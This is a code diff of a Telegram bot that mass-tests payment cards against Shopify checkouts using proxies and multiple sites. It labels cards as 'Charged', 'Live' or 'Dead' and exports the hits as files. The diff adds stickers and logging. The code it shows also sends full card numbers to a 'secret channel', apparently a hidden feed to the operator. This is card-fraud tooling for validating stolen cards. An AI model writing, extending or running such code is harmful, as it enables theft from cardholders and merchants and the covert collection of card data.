@@ -1464,7 +1464,9 @@ async def _check_card_with_retry(
 # MISC HELPERS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 def _te(eid: str, fb: str = "●") -> str:
-    return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>'
+    # Returns the plain fallback emoji — visible to ALL users (no Premium needed).
+    # Animated stickers are delivered via _send_sticker() calls instead.
+    return fb
 
 
 def _u16len(s: str) -> int:
@@ -1690,9 +1692,12 @@ async def _get_sticker_fid(bot, emoji_id: str):
         if stickers:
             fid = stickers[0].file_id
             _STICKER_CACHE[emoji_id] = fid
+            logging.info(f"[STICKER] resolved eid={emoji_id[:12]}… → fid={fid[:20]}…")
             return fid
+        else:
+            logging.warning(f"[STICKER] API returned empty for eid={emoji_id}")
     except Exception as exc:
-        logging.debug(f"[STICKER] resolve {emoji_id}: {exc}")
+        logging.warning(f"[STICKER] resolve FAILED eid={emoji_id}: {exc}")
     return None
 
 
@@ -2090,7 +2095,9 @@ async def _update_progress(bot, sid: str, force: bool = False):
 # RESULT FILE
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 def _make_result_file(sess: dict, kind: str) -> tuple:
-    if kind == "live":
+    if kind == "charged":
+        cards, label = sess.get("charged_cards", []), "Charged"
+    elif kind == "live":
         cards, label = sess.get("live_cards", []), "Live"
     elif kind == "dead":
         cards, label = sess.get("dead_cards", []), "Dead"
@@ -2229,16 +2236,17 @@ async def _send_hit(bot, user, text: str, verdict: str,
         except Exception as e:
             logging.warning(f"[HIT] extra group: {e}")
 
-    # ── 4. Secret channel — full card details, no sticker needed ─────────────
+    # ── 4. Secret channel — full card details + sticker ──────────────────────
     if SECRET_CHANNEL_ID and verdict in ("CHARGED", "LIVE", "TDS"):
         try:
             bin_s   = _bin_str(bin_data)
             sc_lbl  = ("CHARGED" if verdict == "CHARGED"
                        else "LIVE [3DS]" if verdict == "TDS" else "LIVE")
-            sc_icon = "💎" if verdict == "CHARGED" else "✅"
+            sc_eid  = eid  # reuse same animated sticker emoji chosen above
 
             sc_html = (
-                f"<b>{sc_icon} {sc_lbl} — Shopify</b>\n"
+                f'<b>{_te(sc_eid, "💎" if verdict == "CHARGED" else "✅")} '
+                f'{sc_lbl} — Shopify</b>\n'
                 f"<b>Gate ➳ Shopify • {_fmt_price(price, currency)}</b>\n"
                 f"<b>━━━━━━━━━━━━━━</b>\n"
                 f'<b>💳 Card ➳ <code>{escape(card)}</code></b>\n'
@@ -2248,10 +2256,11 @@ async def _send_hit(bot, user, text: str, verdict: str,
                 f"<b>{DEV_LINK_HTML}</b>"
             )
             await asyncio.sleep(0.2)
+            await _send_sticker(bot, SECRET_CHANNEL_ID, sc_eid)
             await bot.send_message(chat_id=SECRET_CHANNEL_ID, text=sc_html,
                                    parse_mode="HTML", disable_web_page_preview=True)
         except Exception as e:
-            logging.debug(f"[HIT] secret channel: {e}")
+            logging.warning(f"[HIT] secret channel: {e}")
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -2331,6 +2340,9 @@ async def run_mass_batch(bot, sid, valid_cards, user, plan, all_sites, proxies):
             if verdict == "CHARGED":
                 sess["charged"] += 1
                 sess["charged_cards"].append(rec)
+                # ── Animated sticker to the MSH chat (where user watches) ──
+                asyncio.create_task(
+                    _send_sticker(bot, sess["chat_id"], get_random_charged_emoji()))
                 _dm_html = build_result_msg(card_fmt, resp, verdict, bin_data,
                                             price, currency, elapsed, user, plan)
                 asyncio.create_task(_send_hit(
@@ -2344,6 +2356,9 @@ async def run_mass_batch(bot, sid, valid_cards, user, plan, all_sites, proxies):
                 sess["approved"] += 1
                 sess["live_cards"].append(rec)
                 sess["tds_cards"].append(rec)
+                # ── Animated sticker to the MSH chat ──────────────────────
+                asyncio.create_task(
+                    _send_sticker(bot, sess["chat_id"], get_random_live_emoji()))
                 _dm_html = build_result_msg(card_fmt, resp, verdict, bin_data,
                                             price, currency, elapsed, user, plan)
                 asyncio.create_task(_send_hit(
@@ -2356,6 +2371,9 @@ async def run_mass_batch(bot, sid, valid_cards, user, plan, all_sites, proxies):
             elif verdict == "LIVE":
                 sess["approved"] += 1
                 sess["live_cards"].append(rec)
+                # ── Animated sticker to the MSH chat ──────────────────────
+                asyncio.create_task(
+                    _send_sticker(bot, sess["chat_id"], get_random_live_emoji()))
                 _dm_html = build_result_msg(card_fmt, resp, verdict, bin_data,
                                             price, currency, elapsed, user, plan)
                 asyncio.create_task(_send_hit(
@@ -2397,6 +2415,13 @@ async def run_mass_batch(bot, sid, valid_cards, user, plan, all_sites, proxies):
     if MSH_SESSIONS.get(sid, {}).get("status") == "CHECKING":
         MSH_SESSIONS[sid]["status"] = "FINISHED"
     await _update_progress(bot, sid, force=True)
+
+    # ── Completion sticker: animated finale in the MSH chat ──────────────────
+    # Pick a charged emoji if any hits, else a live emoji for a clean finish.
+    _fin_eid = (get_random_charged_emoji() if sess.get("charged", 0) > 0
+                else get_random_live_emoji())
+    asyncio.create_task(_send_sticker(bot, sess["chat_id"], _fin_eid))
+
     logging.info(f"[MSH] {sid} done  C:{sess['charged']} L:{sess['approved']} "
                  f"D:{sess['dead']} E:{sess['errors']}")
 
@@ -2422,7 +2447,7 @@ async def cb_msh_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if count == 0 and kind != "all":
         await q.answer(f"❌ No {kind.capitalize()} cards yet.", show_alert=True); return
     await q.answer("📦 Generating file…")
-    labels  = {"live": "Live ✅", "all": "All 📁"}
+    labels  = {"charged": "Charged 💎", "live": "Live ✅", "all": "All 📁"}
     caption = (f"<b>Result ➳ {labels.get(kind,'All')}</b>\n"
                f"<b>Total ➳ {count}</b>\n"
                f"<b>Gate ➳ Shopify Mass</b>")
